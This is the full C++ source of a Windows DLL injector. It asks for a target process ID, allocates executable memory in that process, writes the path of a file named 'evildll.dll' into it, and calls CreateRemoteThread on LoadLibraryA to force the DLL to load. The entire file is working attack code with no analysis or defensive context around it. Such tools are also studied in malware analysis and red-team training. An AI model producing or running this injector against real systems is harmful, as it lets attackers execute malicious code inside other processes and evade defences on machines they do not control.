
#include <windows.h>
#include <iostream>


using namespace std;


char toDLL[] = "C:\\path\\to\\evildll.dll"; //Replace with the path to your evildll.cpp
int pid;

HANDLE hprocess; 
LPVOID paddress;
HMODULE hModule;
FARPROC pLoadLibrary;
HANDLE procThread;

int main(){

    cout << "[?] What is the PID of the Process you want to inject?: ";
    cin >> pid;


    hprocess = OpenProcess(PROCESS_CREATE_THREAD|PROCESS_VM_WRITE|PROCESS_VM_OPERATION, true, pid);

    if(hprocess == NULL){
        cout << "[!] Could not get Process Handle on the given PID"; 
        return 1;
    }


    paddress = VirtualAllocEx(hprocess, nullptr, strlen(toDLL) + 1, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    if(paddress == NULL){
        cout << "[!] Could not allocate space on to the virtual address of the given PID"; 
        return 1;
    }

    hModule = GetModuleHandleW(L"kernel32.dll");
    pLoadLibrary = GetProcAddress(hModule, "LoadLibraryA");

    if(!WriteProcessMemory(hprocess, paddress, toDLL, strlen(toDLL) + 1, NULL)){
        cout << "[!] Could not write into the memory of the given PID"; 
        return 1;
    }

    


    procThread = CreateRemoteThread(hprocess, nullptr, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, paddress, 0, NULL);

    if(procThread == NULL){
        cout << "[!] Could not create remote thread on the given PID"; 
        return 1;
    }




    cout << "[+] DLL successfully injected!"; 
    return 0;
    
}


